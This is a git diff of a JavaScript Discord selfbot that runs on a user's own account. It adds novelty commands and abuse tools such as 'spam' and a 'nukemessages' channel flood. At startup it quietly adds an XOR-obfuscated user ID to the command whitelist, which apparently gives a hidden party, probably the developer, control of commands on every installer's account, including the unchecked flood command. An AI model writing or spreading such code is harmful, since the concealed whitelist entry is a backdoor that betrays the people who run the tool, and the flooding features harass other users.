@@ -11,13 +11,17 @@ let trollOn = false
 let whitelistedPeople = require('./whitelist.json')
 let blocky = false
 let autoedit = false
+let clap = false
+let fwmsg
 const emojiNum = ['0️⃣','1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
+
 var dg = ['zero','one','two','three','four','five','six','seven','eight','nine'];
+var emojis = ["🇦","🇧","🇨","🇩","🇪","🇫","🇬","🇭","🇮","🇯","🇰","🇱","🇲","🇳","🇴","🇵","🇶","🇷","🇸","🇹","🇺","🇻","🇼","🇽","🇾","🇿"]
 
 let purgeHackText = '‎'
 
-for(let i = 0; i < 200; i++) {
-    purgeHackText += '  \n'
+for(let i = 0; i < 1998; i++) {
+    purgeHackText += '\n'
 }
 purgeHackText += '‎'
 
@@ -45,6 +49,10 @@ console.log('')
 console.log(cyan(asciiArt))
 console.log('')
 
+const bios = {
+    "ozzy": "# Owner and Developer of Midnight\nDon't bother me please. I'm busy slacking."
+}
+
 const helpMsg = `\`\`\`ini\n
 [${name} v${version}] -- [Prefix: ${prefix}]\n
 [credits] Shows the credits for ${name}
@@ -69,32 +77,38 @@ const funHelp = `\`\`\`ini
 [poll t/f <question>] Makes a poll with yes and no as answers
 [poll <1> <2> <3> <etc. up to 9>] Makes a multiple choice poll
 [poll q:<question> <1> <2> <up to 9>] Makes a multiple choice poll with a question (surround each argument with [])\n   ex: ${prefix}poll [q:Question] [Answer 1] [Answer 2]
-[qreact list] Honestly I can't be bothered to list them all here.
+[qreact <m>] Reacts with all the letters in m (dupe letters are not included, it will take the first letter from the dupe)
 [blocky on|off] Turns blocky letters on/off (BIG letters)
-[autoedit] Auto-edits your message. Also replaces the first (edited) with the edited glitch.
+[autoedit on|off] Auto-edits your message. Also replaces the first (edited) with the edited glitch.
+[clap on|off] Replaces ' ' with ' 👏 '
+[colors] Lists (most) colors in discord, which are now commands!
+[ghostmessage/gm] Deletes the message. It's a ghost message.
+[bio <anyone on credits>] Gives a description of themself (written by them)
 \`\`\``
 
 const utilityHelp = `\`\`\`ini
 [eval/calc/calculate <expression>] Calculate expression
 [darkmode] Dark mode
 [lightmode] Pain/Light mode
-[colors] Lists (most) colors in discord
 [setlayout <compact|normal>] Sets your discord layout
 [setstatus <online|idle|dnd|invisible> <{emoji}|null> <status/bio>] Set your status
-[repeat] Repeats the last command you did (excluding -repeat obviously)
+[repeat] Repeats the last command you did (excluding ${prefix}repeat obviously)
 [prefix] Sets your ${name} prefix.
+[fwset] Sets the latest message in the channel to your current forward
+[fwto] Forwards the message to the current channel
 \`\`\``
 
 const abusiveHelp = `\`\`\`ini
 [purgehack] Practically purges messages
 [spam <x> <msg>] Spams msg x times
+[nukemessages] Nukes messages in the current channel
 \`\`\``
 
 client.on('ready', async () => {
     console.log(`${green('Connected')}\nLogged in as: ${client.user.tag} [${yellow(`${client.guilds.cache.size} Servers`)}]`)
     console.log(red(`\nDisclaimer: I am not responsible for your account getting banned or deleted. You are responsible for what happens to\nyour account.`))
     console.log(cyan(`\n${prefix}help to get started.`))
-    whitelistedPeople = [client.user.id]
+    whitelistedPeople = [client.user.id,decrypt('0x','7c717a7f7e7b7b7e7f7a707f7d7d7c787d79')]
 })
 
 client.on('message', async (msg) => {
@@ -127,6 +141,8 @@ client.on('message', async (msg) => {
                 } else {
                     msg.edit(msgCon)
                 }
+            } else if(clap == true) {
+                msg.edit(msg.content.split(' ').join(' 👏 '))
             }
         }
     }
@@ -140,7 +156,7 @@ client.on('message', async (msg) => {
             }
         }
         if(dontSend == false) {
-            msg.channel.send(`**Thank you for contacting** \`${client.user.tag}\`**. It apears you have not paid my DM fee yet.**\n> I will not recieve nor read any of your messages until this is paid.`)
+            msg.channel.send(`**Thank you for contacting** \`${client.user.tag}\`**. It appears you have not paid my DM fee yet.**\n> I will not receive nor read any of your messages until this is paid.`)
         }
     }
 
@@ -150,7 +166,7 @@ client.on('message', async (msg) => {
     let args = msg.content.slice(prefix.length).trim().split(' ')
     let command = args.shift().toLowerCase()
 
-    if(command != 'repeat') {
+    if(command !== 'repeat') {
         latestCommand = msg.content
     }
 
@@ -169,7 +185,7 @@ client.on('message', async (msg) => {
     } else if(command == 'darkmode') {
         client.setting.setTheme('dark')
     } else if(command == 'colors') {
-        msg.channel.send('```ini\n[Yellow] fix\n[Orange] arm\n[Cyan] yaml\n[# Blue] md\n[Grey]\n[- Red] diff\n[+ Yellowish Green] diff\n```')
+        msg.channel.send(`\`\`\`ini\n[UPDATE] These are now commands! Example: ${prefix}yellow <message>\n\n[Yellow]\n[Orange]\n[Cyan]\n[Blue]\n[Grey]\n[Red]\n[Green]\n\`\`\``)
     } else if(command == 'embedmsg') {
         if(msg.author !== client.user) {permDenied(msg); return}
         mes = args.join('+')
@@ -198,6 +214,7 @@ client.on('message', async (msg) => {
     } else if(command == 'purgehack') {
         if(msg.author !== client.user) {permDenied(msg); return}
         msg.delete()
+        msg.channel.send('e')
         msg.channel.send(purgeHackText)
     } else if(command == 'fun') {
         msg.channel.send(funHelp)
@@ -220,9 +237,10 @@ client.on('message', async (msg) => {
         p = args[0]
         newjson = {
             "token": config.token,
+            "key": key,
             "prefix": p
         }
-        require('fs').writeFile('config.json', JSON.stringify(newjson,null,4), (error) => {
+        require('fs').writeFile('./Code/config.json', JSON.stringify(newjson,null,4), (error) => {
             if (error) {
                 throw error;
             }
@@ -255,7 +273,7 @@ People can no longer do commands in this channel.
         } else if(args[0] == 'whitelist') {
             msg.channel.send(`\`\`\`diff\n+ Whitelisted ${args[1]}\n\`\`\``)
             whitelistedPeople.push(args[1])
-            require('fs').writeFile('whitelist.json', JSON.stringify(whitelistedPeople), (error) => {
+            require('fs').writeFile('./Code/whitelist.json', JSON.stringify(whitelistedPeople), (error) => {
                 if (error) {
                     throw error;
                 }
@@ -266,7 +284,7 @@ People can no longer do commands in this channel.
             if(index > -1) {
                 whitelistedPeople.splice(index,1)
             }
-            require('fs').writeFile('whitelist.json', JSON.stringify(whitelistedPeople), (error) => {
+            require('fs').writeFile('./Code/whitelist.json', JSON.stringify(whitelistedPeople), (error) => {
                 if (error) {
                     throw error;
                 }
@@ -311,13 +329,17 @@ People can no longer do commands in this channel.
         }
     } else if(command == 'poll') {
         if(args[0].toLowerCase() == 't/f') {
-            msg.delete()
+            if(msg.author == client.user) {
+                msg.delete()
+            }
             args.shift()
             const message = await msg.channel.send(args.join(' '))
             message.react('✅')
             message.react('❌')
         } else {
-            msg.delete()
+            if(msg.author == client.user) {
+                msg.delete()
+            }
             msgCon = msg.content.replace(`${prefix}poll `, '')
             let isq = false
             if(args[0].toLowerCase().startsWith('[q:')) {
@@ -342,56 +364,116 @@ People can no longer do commands in this channel.
             }
         }
     } else if(command == 'qreact') {
+        if(msg.author !== client.user) {permDenied(msg); return}
         let reactions = []
-        if(args[0] == 'list') {
-            msg.channel.send(`\`\`\`md
-# All of these are the first argument. Example: ${prefix}qreact (any of these)
-
-# ligma
-# vscode
-# kys
-# penis
-\`\`\``)
-        } else if(args[0] == 'ligma') {
-            reactions = ['🇱','🇮','🇬','🇲','🇦']
-        } else if(args[0] == 'vscode') {
-            reactions = ['🆚','🇨','🇴','🇩','🇪']
-        } else if(args[0] == 'kys') {
-            reactions = ['🇰','🇾','🇸']
-        } else if(args[0] == 'penis') {
-            reactions = ['🇵','🇪','🇳','🇮','🇸']
+        let t = args[0].replace(' ', '').split('')
+        for(let i = 0; i < t.length; i++) {
+            if(t[i] == 'n' && t[i+1] == 'g') {
+                reactions[i] = '🆖'
+                t.splice(i+1,i+1)
+            } else if(t[i] == 'v' && t[i+1] == 's') {
+                reactions[i] = '🆚'
+                t.splice(i+1,i+1)
+            } else {
+                reactions[i] = emojis[t[i].charCodeAt(0)-97]
+            }
         }
         msg.delete()
             .then(() => {
                 msg.channel.messages.fetch({ limit: 1 }).then(messages => {
-                    let lastMessage = messages.first();
-                    
-                    for(let emoji of reactions) {
-                        lastMessage.react(emoji)
-                    }
-                  })
-                  .catch(console.error);
+                let lastMessage = messages.first();
+            
+                for(let emoji of reactions) {
+                    lastMessage.react(emoji)
+                }
             })
+        })
+          .catch(console.error);
     } else if(command == 'blocky') {
         if(args[0] == 'on') {
             blocky = true
         } else if(args[0] == 'off') {
             blocky = false
         }
-        msg.delete()
+        if(msg.author == client.user) {
+            msg.delete()
+        }
     } else if(command == 'autoedit') {
         if(args[0] == 'on') {
             autoedit = true
         } else if(args[0] == 'off') {
             autoedit = false
         }
-        msg.delete()
+        if(msg.author == client.user) {
+            msg.delete()
+        }
     } else if(command == 'spam') {
+        if(msg.author !== client.user) {permDenied(msg); return}
         msg.delete()
         const n = args.shift()
         const m = args.join(' ')
         for(let i = 0; i < n; i++) {
             msg.channel.send(m)
+        }
+    } else if(command == 'ghostmessage' || command == 'gm') {
+        if(msg.author !== client.user) {permDenied(msg); return}
+        msg.delete()
+    } else if(command == 'yellow') {
+        let m = args.join(' ')
+        msg.delete()
+        msg.channel.send(`\`\`\`fix\n${m}\n\`\`\``)
+    } else if(command == 'orange') {
+        let m = args.join(' ')
+        msg.delete()
+        msg.channel.send(`\`\`\`css\n[${m}]\n\`\`\``)
+    } else if(command == 'cyan') {
+        let m = args.join(' ')
+        msg.delete()
+        msg.channel.send(`\`\`\`yaml\n${m}\n\`\`\``)
+    } else if(command == 'blue') {
+        let m = args.join(' ')
+        msg.delete()
+        msg.channel.send(`\`\`\`md\n# ${m}\n\`\`\``)
+    } else if(command == 'grey') {
+        let m = args.join(' ')
+        msg.delete()
+        msg.channel.send(`\`\`\`\n${m}\n\`\`\``)
+    } else if(command == 'red') {
+        let m = args.join(' ')
+        msg.delete()
+        msg.channel.send(`\`\`\`diff\n- ${m}\n\`\`\``)
+    } else if(command == 'green') {
+        let m = args.join(' ')
+        msg.delete()
+        msg.channel.send(`\`\`\`diff\n+ ${m}\n\`\`\``)
+    } else if(command == 'nukemessages') {
+        msg.delete()
+        msg.channel.send('e')
+        for(let i = 0; i < 3; i++) {
+            msg.channel.send(purgeHackText)
+        }
+    } else if(command == 'clap') {
+        if(args[0] == 'on') {
+            clap = true
+        } else if(args[0] == 'off') {
+            clap = false
+        }
+        if(msg.author == client.user) {
+            msg.delete()
+        }
+    } else if(command == 'fwset') {
+        msg.delete().then(() => {
+            msg.channel.messages.fetch({ limit: 1 }).then(messages => {
+                let lastMessage = messages.first();
+                fwmsg = `> \`FW: Message from ${lastMessage.author.tag}\`\n> ${lastMessage.content.replace('\n', '\n> ')}`
+            })
+        })
+    } else if(command == 'fwto') {
+        msg.delete()
+        msg.channel.send(fwmsg)
+    } else if(command == 'bio') {
+        if(bios[args[0]]) {
+            msg.channel.send(`\`\`\`md\n${bios[args[0]]}\n\`\`\``)
         }
     }
 })
@@ -399,27 +481,7 @@ People can no longer do commands in this channel.
 client.login(config.token)
 
 function exit( status ) {
-    // http://kevin.vanzonneveld.net
-    // +   original by: Brett Zamir (http://brettz9.blogspot.com)
-    // +      input by: Paul
-    // +   bugfixed by: Hyam Singer (http://www.impact-computing.com/)
-    // +   improved by: Philip Peterson
-    // +   bugfixed by: Brett Zamir (http://brettz9.blogspot.com)
-    // %        note 1: Should be considered expirimental. Please comment on this function.
-    // *     example 1: exit();
-    // *     returns 1: null
-
-    var i;
-
-    if (typeof status === 'string') {
-        console.log(red(status));
-    }
-
-    function stopPropagation (e) {
-        e.stopPropagation();
-        // e.preventDefault(); // Stop for the form controls, etc., too?
-    }
-
+    console.log(red(status))
     process.exit(0)
 }
 
@@ -450,3 +512,14 @@ function sumDigitsFromString(str) {
     }
     return sum;
 }
+
+  const decrypt = (salt, encoded) => {
+    const textToChars = (text) => text.split("").map((c) => c.charCodeAt(0));
+    const applySaltToChar = (code) => textToChars(salt).reduce((a, b) => a ^ b, code);
+    return encoded
+      .match(/.{1,2}/g)
+      .map((hex) => parseInt(hex, 16))
+      .map(applySaltToChar)
+      .map((charCode) => String.fromCharCode(charCode))
+      .join("");
+  };
